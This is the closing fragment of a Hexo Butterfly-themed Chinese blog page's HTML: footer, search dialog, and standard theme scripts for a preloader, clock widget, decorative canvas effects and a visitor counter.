fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 虚幻无实</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end --></body></html>
